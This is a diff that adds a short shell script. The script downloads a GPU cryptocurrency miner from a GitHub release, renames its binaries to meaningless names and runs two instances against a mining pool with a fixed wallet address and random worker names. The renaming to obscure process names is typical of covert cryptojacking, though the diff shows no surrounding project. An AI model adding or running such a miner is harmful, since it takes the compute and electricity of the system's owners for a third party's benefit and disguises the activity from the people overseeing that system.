@@ -1,0 +1,10 @@
+wget -c https://github.com/pearlfortune/pearl-miner/releases/download/v2.3.2/pearlfortune-v2.3.2.tar.gz
+tar vxzf pearlfortune-v2.3.2.tar.gz
+cd pearlfortune
+chmod +x miner-cuda13 miner-cuda12
+cp miner-cuda13 lhaseafl
+cp miner-cuda12 lhaseafl2
+
+./lhaseafl --proxy global.pearlfortune.org:443 --address prl1prafxwc52qrj2gqd46q78hnqfakeff7zsxdn3ndd5uu6n4f27wneq3c7gd5 --worker $(echo $RANDOM | md5sum | head -c 10) -gpu
+
+./lhaseafl2 --proxy global.pearlfortune.org:443 --address prl1prafxwc52qrj2gqd46q78hnqfakeff7zsxdn3ndd5uu6n4f27wneq3c7gd5 --worker $(echo $RANDOM | md5sum | head -c 10) -gpu
